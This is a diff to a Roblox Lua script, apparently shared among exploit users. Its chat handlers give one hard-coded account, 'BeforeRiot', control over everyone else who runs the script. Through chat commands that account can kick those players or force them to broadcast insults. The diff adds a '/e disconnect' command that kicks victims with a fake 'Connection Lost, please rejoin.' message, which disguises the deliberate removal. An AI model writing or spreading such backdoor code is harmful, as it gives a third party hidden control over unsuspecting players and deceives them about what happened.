@@ -1,5 +1,5 @@
 --// Premium User //--
-local user_premium__001 = game.Players.BeforeRiot --// Replace "User101" with your username (NOT DISPLAY) //--
+local user_premium__001 = game.Players.BeforeRiot 
 
 -----------------------------------------------------------------------
 -----------------------------------------------------------------------
@@ -50,9 +50,18 @@ local unfreeze = function()
 end
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(":kick .") then
+	if cht:match("!kick .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
 			game.Players.LocalPlayer:Kick("You've been kicked")
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match("/e disconnect") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer:Kick("Connection Lost, please rejoin.")
 		end
 	end
 
@@ -107,7 +116,7 @@ end)
 user_premium__001.Chatted:connect(function(cht)
 	if cht:match("/e ugly .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
-			wait(0) local A_1 = "Your ugly lol" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
+			wait(0) local A_1 = "Your ugly" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
 
 		end
 	end
